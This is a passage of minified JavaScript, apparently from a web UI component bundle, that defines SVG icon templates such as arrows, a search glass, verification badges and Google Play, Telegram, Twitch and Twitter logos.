  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M16.32 13.62a3.14 3.14 0 1 1-.99 1.72l-1.6-.93a3.83 3.83 0 0 1-3.71 1 3.66 3.66 0 0 1-1.74-1l-1.6.94a3.14 3.14 0 1 1-1-1.73l1.6-.94a3.7 3.7 0 0 1 0-2 3.81 3.81 0 0 1 1.8-2.33c.29-.17.6-.3.92-.38V6.1a3.14 3.14 0 1 1 2 0l-.01.02v1.85H12a3.82 3.82 0 0 1 2.33 1.8 3.7 3.7 0 0 1 .39 2.91l1.6.93ZM2.6 16.54a1.14 1.14 0 0 0 1.98-1.14 1.14 1.14 0 0 0-1.98 1.14ZM11 2.01a1.14 1.14 0 1 0 0 2.28 1.14 1.14 0 0 0 0-2.28Zm1.68 10.45c.08-.19.14-.38.16-.58v-.05l.02-.13v-.13a1.92 1.92 0 0 0-.24-.8l-.11-.15a1.89 1.89 0 0 0-.74-.6 1.86 1.86 0 0 0-.77-.17h-.19a1.97 1.97 0 0 0-.89.34 1.98 1.98 0 0 0-.61.74 1.99 1.99 0 0 0-.16.9v.05a1.87 1.87 0 0 0 .24.74l.1.15c.12.16.26.3.42.42l.16.1.13.07.04.02a1.84 1.84 0 0 0 .76.17h.17a2 2 0 0 0 .91-.35 1.78 1.78 0 0 0 .52-.58l.03-.05a.84.84 0 0 0 .05-.11Zm5.15 4.5a1.14 1.14 0 0 0 1.14-1.97 1.13 1.13 0 0 0-1.55.41c-.32.55-.13 1.25.41 1.56Z"
    clip-rule="evenodd"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.63 9.43a1.5 1.5 0 1 0 1.5-2.6 1.5 1.5 0 0 0-1.5 2.6Zm.32-1.55a.5.5 0 0 1 .68-.19.5.5 0 0 1 .18.68.5.5 0 0 1-.68.19.5.5 0 0 1-.18-.68ZM17.94 8.88a1.5 1.5 0 1 1-2.6-1.5 1.5 1.5 0 1 1 2.6 1.5ZM16.9 7.69a.5.5 0 0 0-.68.19.5.5 0 0 0 .18.68.5.5 0 0 0 .68-.19.5.5 0 0 0-.18-.68ZM9.75 17.75a1.5 1.5 0 1 1 2.6 1.5 1.5 1.5 0 1 1-2.6-1.5Zm1.05 1.18a.5.5 0 0 0 .68-.18.5.5 0 0 0-.18-.68.5.5 0 0 0-.68.18.5.5 0 0 0 .18.68Z"
    clip-rule="evenodd"
  />
</svg>`,aPe=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.13 1h1.71c1.46 0 2.63 0 3.56.1.97.1 1.8.33 2.53.85a5 5 0 0 1 1.1 1.11c.53.73.75 1.56.86 2.53.1.93.1 2.1.1 3.55v1.72c0 1.45 0 2.62-.1 3.55-.1.97-.33 1.8-.86 2.53a5 5 0 0 1-1.1 1.1c-.73.53-1.56.75-2.53.86-.93.1-2.1.1-3.55.1H9.13c-1.45 0-2.62 0-3.56-.1-.96-.1-1.8-.33-2.52-.85a5 5 0 0 1-1.1-1.11 5.05 5.05 0 0 1-.86-2.53c-.1-.93-.1-2.1-.1-3.55V9.14c0-1.45 0-2.62.1-3.55.1-.97.33-1.8.85-2.53a5 5 0 0 1 1.1-1.1 5.05 5.05 0 0 1 2.53-.86C6.51 1 7.67 1 9.13 1ZM5.79 3.09a3.1 3.1 0 0 0-1.57.48 3 3 0 0 0-.66.67c-.24.32-.4.77-.48 1.56-.1.82-.1 1.88-.1 3.4v1.6c0 1.15 0 2.04.05 2.76l.41-.42c.5-.5.93-.92 1.32-1.24.41-.33.86-.6 1.43-.7a3 3 0 0 1 .94 0c.35.06.66.2.95.37a17.11 17.11 0 0 0 .8.45c.1-.08.2-.2.41-.4l.04-.03a27 27 0 0 1 1.95-1.84 4.03 4.03 0 0 1 1.91-.94 4 4 0 0 1 1.25 0c.73.11 1.33.46 1.91.94l.64.55V9.2c0-1.52 0-2.58-.1-3.4a3.1 3.1 0 0 0-.48-1.56 3 3 0 0 0-.66-.67 3.1 3.1 0 0 0-1.56-.48C13.37 3 12.3 3 10.79 3h-1.6c-1.52 0-2.59 0-3.4.09Zm11.18 10-.04-.05a26.24 26.24 0 0 0-1.83-1.74c-.45-.36-.73-.48-.97-.52a2 2 0 0 0-.63 0c-.24.04-.51.16-.97.52-.46.38-1.01.93-1.83 1.74l-.02.02c-.17.18-.34.34-.49.47a2.04 2.04 0 0 1-1.08.5 1.97 1.97 0 0 1-1.25-.27l-.79-.46-.02-.02a.65.65 0 0 0-.24-.1 1 1 0 0 0-.31 0c-.08.02-.21.06-.49.28-.3.24-.65.59-1.2 1.14l-.56.56-.65.66a3 3 0 0 0 .62.6c.33.24.77.4 1.57.49.81.09 1.88.09 3.4.09h1.6c1.52 0 2.58 0 3.4-.09a3.1 3.1 0 0 0 1.56-.48 3 3 0 0 0 .66-.67c.24-.32.4-.77.49-1.56l.07-1.12Zm-8.02-1.03ZM4.99 7a2 2 0 1 1 4 0 2 2 0 0 1-4 0Z"
    clip-rule="evenodd"
  />
</svg>`,cPe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M8 0a1 1 0 0 1 1 1v5.38a1 1 0 0 1-2 0V1a1 1 0 0 1 1-1ZM5.26 2.6a1 1 0 0 1-.28 1.39 5.46 5.46 0 1 0 6.04 0 1 1 0 1 1 1.1-1.67 7.46 7.46 0 1 1-8.25 0 1 1 0 0 1 1.4.28Z"
    clip-rule="evenodd"
  />
</svg>`,lPe=xe` <svg
  width="36"
  height="36"
  fill="none"
>
  <path
    d="M0 8a8 8 0 0 1 8-8h20a8 8 0 0 1 8 8v20a8 8 0 0 1-8 8H8a8 8 0 0 1-8-8V8Z"
    fill="#fff"
    fill-opacity=".05"
  />
  <path
    d="m18.262 17.513-8.944 9.49v.01a2.417 2.417 0 0 0 3.56 1.452l.026-.017 10.061-5.803-4.703-5.132Z"
    fill="#EA4335"
  />
  <path
    d="m27.307 15.9-.008-.008-4.342-2.52-4.896 4.36 4.913 4.912 4.325-2.494a2.42 2.42 0 0 0 .008-4.25Z"
    fill="#FBBC04"
  />
  <path
    d="M9.318 8.997c-.05.202-.084.403-.084.622V26.39c0 .218.025.42.084.621l9.246-9.247-9.246-8.768Z"
    fill="#4285F4"
  />
  <path
    d="m18.33 18 4.627-4.628-10.053-5.828a2.427 2.427 0 0 0-3.586 1.444L18.329 18Z"
    fill="#34A853"
  />
  <path
    d="M8 .5h20A7.5 7.5 0 0 1 35.5 8v20a7.5 7.5 0 0 1-7.5 7.5H8A7.5 7.5 0 0 1 .5 28V8A7.5 7.5 0 0 1 8 .5Z"
    stroke="#fff"
    stroke-opacity=".05"
  />
</svg>`,uPe=xe`<svg
  width="13"
  height="12"
  viewBox="0 0 13 12"
  fill="none"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M0.794373 5.99982C0.794373 5.52643 1.17812 5.14268 1.6515 5.14268H5.643V1.15109C5.643 0.677701 6.02675 0.293946 6.50012 0.293945C6.9735 0.293946 7.35725 0.677701 7.35725 1.15109V5.14268H11.3488C11.8221 5.14268 12.2059 5.52643 12.2059 5.99982C12.2059 6.47321 11.8221 6.85696 11.3488 6.85696H7.35725V10.8486C7.35725 11.3219 6.9735 11.7057 6.50012 11.7057C6.02675 11.7057 5.643 11.3219 5.643 10.8486V6.85696H1.6515C1.17812 6.85696 0.794373 6.47321 0.794373 5.99982Z"
  /></svg
>`,dPe=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    d="M3 6a3 3 0 0 1 3-3h1a1 1 0 1 0 0-2H6a5 5 0 0 0-5 5v1a1 1 0 0 0 2 0V6ZM13 1a1 1 0 1 0 0 2h1a3 3 0 0 1 3 3v1a1 1 0 1 0 2 0V6a5 5 0 0 0-5-5h-1ZM3 13a1 1 0 1 0-2 0v1a5 5 0 0 0 5 5h1a1 1 0 1 0 0-2H6a3 3 0 0 1-3-3v-1ZM19 13a1 1 0 1 0-2 0v1a3 3 0 0 1-3 3h-1a1 1 0 1 0 0 2h1.01a5 5 0 0 0 5-5v-1ZM5.3 6.36c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05A1.5 1.5 0 0 0 9.2 8.14c.06-.2.06-.43.06-.89s0-.7-.06-.89A1.5 1.5 0 0 0 8.14 5.3c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06ZM10.8 6.36c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05a1.5 1.5 0 0 0 1.06-1.06c.06-.2.06-.43.06-.89s0-.7-.06-.89a1.5 1.5 0 0 0-1.06-1.06c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06ZM5.26 12.75c0-.46 0-.7.05-.89a1.5 1.5 0 0 1 1.06-1.06c.19-.05.42-.05.89-.05.46 0 .7 0 .88.05.52.14.93.54 1.06 1.06.06.2.06.43.06.89s0 .7-.06.89a1.5 1.5 0 0 1-1.06 1.06c-.19.05-.42.05-.88.05-.47 0-.7 0-.9-.05a1.5 1.5 0 0 1-1.05-1.06c-.05-.2-.05-.43-.05-.89ZM10.8 11.86c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05a1.5 1.5 0 0 0 1.06-1.06c.06-.2.06-.43.06-.89s0-.7-.06-.89a1.5 1.5 0 0 0-1.06-1.06c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06Z"
  />
</svg>`,hPe=xe`<svg
  fill="none"
  viewBox="0 0 21 20"
>
  <path
    fill="currentColor"
    d="M8.8071 0.292893C9.19763 0.683417 9.19763 1.31658 8.8071 1.70711L6.91421 3.6H11.8404C14.3368 3.6 16.5533 5.1975 17.3427 7.56588L17.4487 7.88377C17.6233 8.40772 17.3402 8.97404 16.8162 9.14868C16.2923 9.32333 15.726 9.04017 15.5513 8.51623L15.4453 8.19834C14.9281 6.64664 13.476 5.6 11.8404 5.6H6.91421L8.8071 7.49289C9.19763 7.88342 9.19763 8.51658 8.8071 8.90711C8.41658 9.29763 7.78341 9.29763 7.39289 8.90711L3.79289 5.30711C3.40236 4.91658 3.40236 4.28342 3.79289 3.89289L7.39289 0.292893C7.78341 -0.0976311 8.41658 -0.0976311 8.8071 0.292893ZM4.18377 10.8513C4.70771 10.6767 5.27403 10.9598 5.44868 11.4838L5.55464 11.8017C6.07188 13.3534 7.52401 14.4 9.15964 14.4L14.0858 14.4L12.1929 12.5071C11.8024 12.1166 11.8024 11.4834 12.1929 11.0929C12.5834 10.7024 13.2166 10.7024 13.6071 11.0929L17.2071 14.6929C17.5976 15.0834 17.5976 15.7166 17.2071 16.1071L13.6071 19.7071C13.2166 20.0976 12.5834 20.0976 12.1929 19.7071C11.8024 19.3166 11.8024 18.6834 12.1929 18.2929L14.0858 16.4L9.15964 16.4C6.66314 16.4 4.44674 14.8025 3.65728 12.4341L3.55131 12.1162C3.37667 11.5923 3.65983 11.026 4.18377 10.8513Z"
  /></svg
>`,fPe=xe`<svg fill="none" viewBox="0 0 14 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.94 1.04a1 1 0 0 1 .7 1.23l-.48 1.68a5.85 5.85 0 0 1 8.53 4.32 5.86 5.86 0 0 1-11.4 2.56 1 1 0 0 1 1.9-.57 3.86 3.86 0 1 0 1.83-4.5l1.87.53a1 1 0 0 1-.55 1.92l-4.1-1.15a1 1 0 0 1-.69-1.23l1.16-4.1a1 1 0 0 1 1.23-.7Z"
    clip-rule="evenodd"
  />
</svg>`,pPe=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.36 4.21a5.14 5.14 0 1 0 0 10.29 5.14 5.14 0 0 0 0-10.29ZM1.64 9.36a7.71 7.71 0 1 1 14 4.47l2.52 2.5a1.29 1.29 0 1 1-1.82 1.83l-2.51-2.51A7.71 7.71 0 0 1 1.65 9.36Z"
    clip-rule="evenodd"
  />
</svg>`,gPe=xe`<svg fill="none" viewBox="0 0 21 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M14.3808 4.34812C13.72 4.47798 12.8501 4.7587 11.5748 5.17296L9.00869 6.00646C6.90631 6.68935 5.40679 7.17779 4.38121 7.63178C3.87166 7.85734 3.5351 8.05091 3.32022 8.22035C3.11183 8.38466 3.07011 8.48486 3.05969 8.51817C2.98058 8.77103 2.98009 9.04195 3.05831 9.29509C3.06861 9.32844 3.10998 9.42878 3.31777 9.59384C3.53205 9.76404 3.86792 9.95881 4.37667 10.1862C5.29287 10.5957 6.58844 11.0341 8.35529 11.6164L10.8876 8.59854C11.2426 8.17547 11.8733 8.12028 12.2964 8.47528C12.7195 8.83029 12.7746 9.46104 12.4196 9.88412L9.88738 12.9019C10.7676 14.5408 11.4244 15.7406 11.9867 16.5718C12.299 17.0333 12.5491 17.3303 12.7539 17.5117C12.9526 17.6877 13.0586 17.711 13.0932 17.7154C13.3561 17.7484 13.6228 17.7009 13.8581 17.5791C13.8891 17.563 13.9805 17.5046 14.1061 17.2708C14.2357 17.0298 14.3679 16.6647 14.5015 16.1237C14.7705 15.0349 14.9912 13.4733 15.2986 11.2843L15.6738 8.61249C15.8603 7.28456 15.9857 6.37917 15.9989 5.7059C16.012 5.03702 15.9047 4.8056 15.8145 4.69183C15.7044 4.55297 15.5673 4.43792 15.4114 4.35365C15.2837 4.28459 15.0372 4.2191 14.3808 4.34812ZM7.99373 13.603C6.11919 12.9864 4.6304 12.4902 3.5606 12.0121C2.98683 11.7557 2.4778 11.4808 2.07383 11.1599C1.66337 10.8339 1.31312 10.4217 1.14744 9.88551C0.949667 9.24541 0.950886 8.56035 1.15094 7.92096C1.31852 7.38534 1.67024 6.97442 2.08185 6.64985C2.48697 6.33041 2.99697 6.05734 3.57166 5.80295C4.70309 5.3021 6.30179 4.78283 8.32903 4.12437L11.0196 3.25042C12.2166 2.86159 13.2017 2.54158 13.9951 2.38566C14.8065 2.22618 15.6202 2.19289 16.3627 2.59437C16.7568 2.80747 17.1035 3.09839 17.3818 3.4495C17.9062 4.111 18.0147 4.91815 17.9985 5.74496C17.9827 6.55332 17.8386 7.57903 17.6636 8.82534L17.2701 11.6268C16.9737 13.7376 16.7399 15.4022 16.4432 16.6034C16.2924 17.2135 16.1121 17.7632 15.8678 18.2176C15.6197 18.6794 15.2761 19.0971 14.7777 19.3551C14.1827 19.6632 13.5083 19.7833 12.8436 19.6997C12.2867 19.6297 11.82 19.3563 11.4277 19.0087C11.0415 18.6666 10.6824 18.213 10.3302 17.6925C9.67361 16.722 8.92648 15.342 7.99373 13.603Z"
    clip-rule="evenodd"
  />
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="21"
    height="20"
    viewBox="0 0 21 20"
    fill="none"
  ></svg></svg
>`,mPe=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.76.3a1 1 0 0 1 0 1.4L4.07 4.4h9a1 1 0 1 1 0 2h-9l2.69 2.68a1 1 0 1 1-1.42 1.42L.95 6.09a1 1 0 0 1 0-1.4l4.4-4.4a1 1 0 0 1 1.4 0Zm6.49 9.21a1 1 0 0 1 1.41 0l4.39 4.4a1 1 0 0 1 0 1.4l-4.39 4.4a1 1 0 0 1-1.41-1.42l2.68-2.68h-9a1 1 0 0 1 0-2h9l-2.68-2.68a1 1 0 0 1 0-1.42Z"
    clip-rule="evenodd"
  />
</svg>`,wPe=xe`<svg width="10" height="10" viewBox="0 0 10 10">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.77986 0.566631C4.0589 0.845577 4.0589 1.29784 3.77986 1.57678L3.08261 2.2738H6.34184C6.73647 2.2738 7.05637 2.5936 7.05637 2.98808C7.05637 3.38257 6.73647 3.70237 6.34184 3.70237H3.08261L3.77986 4.39938C4.0589 4.67833 4.0589 5.13059 3.77986 5.40954C3.50082 5.68848 3.04841 5.68848 2.76937 5.40954L0.852346 3.49316C0.573306 3.21421 0.573306 2.76195 0.852346 2.48301L2.76937 0.566631C3.04841 0.287685 3.50082 0.287685 3.77986 0.566631ZM6.22 4.59102C6.49904 4.31208 6.95145 4.31208 7.23049 4.59102L9.14751 6.5074C9.42655 6.78634 9.42655 7.23861 9.14751 7.51755L7.23049 9.43393C6.95145 9.71287 6.49904 9.71287 6.22 9.43393C5.94096 9.15498 5.94096 8.70272 6.22 8.42377L6.91725 7.72676L3.65802 7.72676C3.26339 7.72676 2.94349 7.40696 2.94349 7.01247C2.94349 6.61798 3.26339 6.29819 3.65802 6.29819L6.91725 6.29819L6.22 5.60117C5.94096 5.32223 5.94096 4.86997 6.22 4.59102Z"
    clip-rule="evenodd"
  />
</svg>`,bPe=xe`<svg
  width="14"
  height="14"
  viewBox="0 0 14 14"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M13.7306 3.24213C14.0725 3.58384 14.0725 4.13786 13.7306 4.47957L10.7418 7.46737C10.4 7.80908 9.84581 7.80908 9.50399 7.46737C9.16216 7.12567 9.16216 6.57165 9.50399 6.22994L10.9986 4.73585H5.34082C4.85741 4.73585 4.46553 4.3441 4.46553 3.86085C4.46553 3.3776 4.85741 2.98585 5.34082 2.98585L10.9986 2.98585L9.50399 1.49177C9.16216 1.15006 9.16216 0.596037 9.50399 0.254328C9.84581 -0.0873803 10.4 -0.0873803 10.7418 0.254328L13.7306 3.24213ZM9.52515 10.1352C9.52515 10.6185 9.13327 11.0102 8.64986 11.0102L2.9921 11.0102L4.48669 12.5043C4.82852 12.846 4.82852 13.4001 4.48669 13.7418C4.14487 14.0835 3.59066 14.0835 3.24884 13.7418L0.26003 10.754C0.0958806 10.5899 0.0036621 10.3673 0.00366211 10.1352C0.00366212 9.90318 0.0958806 9.68062 0.26003 9.51652L3.24884 6.52872C3.59066 6.18701 4.14487 6.18701 4.48669 6.52872C4.82851 6.87043 4.82851 7.42445 4.48669 7.76616L2.9921 9.26024L8.64986 9.26024C9.13327 9.26024 9.52515 9.65199 9.52515 10.1352Z"
    fill="currentColor"
  />
</svg>

`,vPe=xe`<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
  <path 
    fill="currentColor"
    fill-rule="evenodd" 
    clip-rule="evenodd" 
    d="M8.3071 0.292893C8.69763 0.683417 8.69763 1.31658 8.3071 1.70711L6.41421 3.6H11.3404C13.8368 3.6 16.0533 5.1975 16.8427 7.56588L16.9487 7.88377C17.1233 8.40772 16.8402 8.97404 16.3162 9.14868C15.7923 9.32333 15.226 9.04017 15.0513 8.51623L14.9453 8.19834C14.4281 6.64664 12.976 5.6 11.3404 5.6H6.41421L8.3071 7.49289C8.69763 7.88342 8.69763 8.51658 8.3071 8.90711C7.91658 9.29763 7.28341 9.29763 6.89289 8.90711L3.29289 5.30711C2.90236 4.91658 2.90236 4.28342 3.29289 3.89289L6.89289 0.292893C7.28341 -0.0976311 7.91658 -0.0976311 8.3071 0.292893ZM3.68377 10.8513C4.20771 10.6767 4.77403 10.9598 4.94868 11.4838L5.05464 11.8017C5.57188 13.3534 7.024 14.4 8.65964 14.4L13.5858 14.4L11.6929 12.5071C11.3024 12.1166 11.3024 11.4834 11.6929 11.0929C12.0834 10.7024 12.7166 10.7024 13.1071 11.0929L16.7071 14.6929C17.0976 15.0834 17.0976 15.7166 16.7071 16.1071L13.1071 19.7071C12.7166 20.0976 12.0834 20.0976 11.6929 19.7071C11.3024 19.3166 11.3024 18.6834 11.6929 18.2929L13.5858 16.4L8.65964 16.4C6.16314 16.4 3.94674 14.8025 3.15728 12.4341L3.05131 12.1162C2.87667 11.5923 3.15983 11.026 3.68377 10.8513Z" 
  />
</svg>`,yPe=xe`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.48 2.18a1 1 0 0 1 1.41 0l2.68 2.68a1 1 0 1 1-1.41 1.42l-.98-.98v4.56a1 1 0 0 1-2 0V5.3l-.97.98A1 1 0 0 1 .79 4.86l2.69-2.68Zm6.34 2.93a1 1 0 0 1 1 1v4.56l.97-.98a1 1 0 1 1 1.42 1.42l-2.69 2.68a1 1 0 0 1-1.41 0l-2.68-2.68a1 1 0 0 1 1.41-1.42l.98.98V6.1a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`,xPe=xe`<svg width="32" height="32" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
  <g clip-path="url(#a)">
    <path fill="url(#b)" d="M0 0h32v32H0z"/>
    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.034 15.252c4.975-2.167 8.293-3.596 9.953-4.287 4.74-1.971 5.725-2.314 6.366-2.325.142-.002.457.033.662.198.172.14.22.33.243.463.022.132.05.435.028.671-.257 2.7-1.368 9.248-1.933 12.27-.24 1.28-.71 1.708-1.167 1.75-.99.091-1.743-.655-2.703-1.284-1.502-.985-2.351-1.598-3.81-2.558-1.684-1.11-.592-1.721.368-2.718.252-.261 4.619-4.233 4.703-4.594.01-.045.02-.213-.08-.301-.1-.09-.246-.059-.353-.035-.15.034-2.55 1.62-7.198 4.758-.682.468-1.298.696-1.851.684-.61-.013-1.782-.344-2.653-.628-1.069-.347-1.918-.53-1.845-1.12.039-.308.462-.623 1.27-.944Z" fill="#fff"/>
  </g>
  <path d="M.5 16C.5 7.44 7.44.5 16 .5 24.56.5 31.5 7.44 31.5 16c0 8.56-6.94 15.5-15.5 15.5C7.44 31.5.5 24.56.5 16Z" stroke="#141414" stroke-opacity=".05"/>
  <defs>
    <linearGradient id="b" x1="1600" y1="0" x2="1600" y2="3176.27" gradientUnits="userSpaceOnUse">
      <stop stop-color="#2AABEE"/>
      <stop offset="1" stop-color="#229ED9"/>
    </linearGradient>
    <clipPath id="a">
      <path d="M0 16C0 7.163 7.163 0 16 0s16 7.163 16 16-7.163 16-16 16S0 24.837 0 16Z" fill="#fff"/>
    </clipPath>
  </defs>
</svg>`,CPe=xe`<svg width="14" height="15" viewBox="0 0 14 15" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M7 3.71875C6.0335 3.71875 5.25 2.93525 5.25 1.96875C5.25 1.00225 6.0335 0.21875 7 0.21875C7.9665 0.21875 8.75 1.00225 8.75 1.96875C8.75 2.93525 7.9665 3.71875 7 3.71875Z" fill="#949E9E"/>
  <path d="M7 8.96875C6.0335 8.96875 5.25 8.18525 5.25 7.21875C5.25 6.25225 6.0335 5.46875 7 5.46875C7.9665 5.46875 8.75 6.25225 8.75 7.21875C8.75 8.18525 7.9665 8.96875 7 8.96875Z" fill="#949E9E"/>
  <path d="M5.25 12.4688C5.25 13.4352 6.0335 14.2187 7 14.2187C7.9665 14.2187 8.75 13.4352 8.75 12.4688C8.75 11.5023 7.9665 10.7188 7 10.7188C6.0335 10.7188 5.25 11.5023 5.25 12.4688Z" fill="#949E9E"/>
</svg>`,EPe=xe`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5A3E85" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M18.22 25.7 20 23.91h3.34l2.1-2.1v-6.68H15.4v8.78h2.82v1.77Zm3.87-8.16h1.25v3.66H22.1v-3.66Zm-3.34 0H20v3.66h-1.25v-3.66ZM20 7.9a12 12 0 1 0 0 24 12 12 0 0 0 0-24Zm6.69 14.56-3.66 3.66h-2.72l-1.77 1.78h-1.88V26.1H13.3v-9.82l.94-2.4H26.7v8.56Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,_Pe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="m14.36 4.74.01.42c0 4.34-3.3 9.34-9.34 9.34A9.3 9.3 0 0 1 0 13.03a6.6 6.6 0 0 0 4.86-1.36 3.29 3.29 0 0 1-3.07-2.28c.5.1 1 .07 1.48-.06A3.28 3.28 0 0 1 .64 6.11v-.04c.46.26.97.4 1.49.41A3.29 3.29 0 0 1 1.11 2.1a9.32 9.32 0 0 0 6.77 3.43 3.28 3.28 0 0 1 5.6-3 6.59 6.59 0 0 0 2.08-.8 3.3 3.3 0 0 1-1.45 1.82A6.53 6.53 0 0 0 16 3.04c-.44.66-1 1.23-1.64 1.7Z"
  />
</svg>`,SPe=xe`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="m4.1 12.43-.45-.78-.93-.2a1.65 1.65 0 0 1-1.31-1.8l.1-.86-.61-.71a1.65 1.65 0 0 1 0-2.16l.6-.7-.09-.85c-.1-.86.47-1.64 1.3-1.81l.94-.2.45-.78A1.65 1.65 0 0 1 6.23.9l.77.36.78-.36c.77-.36 1.69-.07 2.12.66l.47.8.91.2c.84.17 1.4.95 1.31 1.8l-.1.86.6.7c.54.62.54 1.54.01 2.16l-.6.71.09.86c.1.85-.47 1.63-1.3 1.8l-.92.2-.47.79a1.65 1.65 0 0 1-2.12.66L7 12.74l-.77.36c-.78.35-1.7.07-2.13-.67Zm5.74-6.9a1 1 0 1 0-1.68-1.07L6.32 7.3l-.55-.66a1 1 0 0 0-1.54 1.28l1.43 1.71a1 1 0 0 0 1.61-.1l2.57-4Z"
    clip-rule="evenodd"
  />
</svg>`,APe=xe`<svg fill="none" viewBox="0 0 28 28">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M18.1 4.76c-.42-.73-1.33-1.01-2.09-.66l-1.42.66c-.37.18-.8.18-1.18 0l-1.4-.65a1.63 1.63 0 0 0-2.1.66l-.84 1.45c-.2.34-.53.59-.92.67l-1.7.35c-.83.17-1.39.94-1.3 1.78l.19 1.56c.04.39-.08.78-.33 1.07l-1.12 1.3c-.52.6-.52 1.5 0 2.11L5 16.38c.25.3.37.68.33 1.06l-.18 1.57c-.1.83.46 1.6 1.28 1.78l1.7.35c.4.08.73.32.93.66l.84 1.43a1.63 1.63 0 0 0 2.09.66l1.41-.66c.37-.17.8-.17 1.18 0l1.43.67c.76.35 1.66.07 2.08-.65l.86-1.45c.2-.34.54-.58.92-.66l1.68-.35A1.63 1.63 0 0 0 22.84 19l-.18-1.57a1.4 1.4 0 0 1 .33-1.06l1.12-1.32c.52-.6.52-1.5 0-2.11l-1.12-1.3a1.4 1.4 0 0 1-.33-1.07l.18-1.57c.1-.83-.46-1.6-1.28-1.77l-1.68-.35a1.4 1.4 0 0 1-.92-.66l-.86-1.47Zm-3.27-3.2a4.43 4.43 0 0 1 5.69 1.78l.54.93 1.07.22a4.43 4.43 0 0 1 3.5 4.84l-.11.96.7.83a4.43 4.43 0 0 1 .02 5.76l-.72.85.1.96a4.43 4.43 0 0 1-3.5 4.84l-1.06.22-.54.92a4.43 4.43 0 0 1-5.68 1.77l-.84-.4-.82.39a4.43 4.43 0 0 1-5.7-1.79l-.51-.89-1.09-.22a4.43 4.43 0 0 1-3.5-4.84l.1-.96-.72-.85a4.43 4.43 0 0 1 .01-5.76l.71-.83-.1-.95a4.43 4.43 0 0 1 3.5-4.84l1.08-.23.53-.9a4.43 4.43 0 0 1 5.7-1.8l.81.38.83-.39ZM18.2 9.4c.65.42.84 1.28.42 1.93l-4.4 6.87a1.4 1.4 0 0 1-2.26.14L9.5 15.39a1.4 1.4 0 0 1 2.15-1.8l1.23 1.48 3.38-5.26a1.4 1.4 0 0 1 1.93-.42Z"
    clip-rule="evenodd"
  />
</svg>`,IPe=xe`
  <svg fill="none" viewBox="0 0 48 44">
    <path
      style="fill: var(--wui-color-bg-300);"
      d="M4.56 8.64c-1.23 1.68-1.23 4.08-1.23 8.88v8.96c0 4.8 0 7.2 1.23 8.88.39.55.87 1.02 1.41 1.42C7.65 38 10.05 38 14.85 38h14.3c4.8 0 7.2 0 8.88-1.22a6.4 6.4 0 0 0 1.41-1.42c.83-1.14 1.1-2.6 1.19-4.92a6.4 6.4 0 0 0 5.16-4.65c.21-.81.21-1.8.21-3.79 0-1.98 0-2.98-.22-3.79a6.4 6.4 0 0 0-5.15-4.65c-.1-2.32-.36-3.78-1.19-4.92a6.4 6.4 0 0 0-1.41-1.42C36.35 6 33.95 6 29.15 6h-14.3c-4.8 0-7.2 0-8.88 1.22a6.4 6.4 0 0 0-1.41 1.42Z"
    />
    <path
      style="fill: var(--wui-color-fg-200);"
      fill-rule="evenodd"
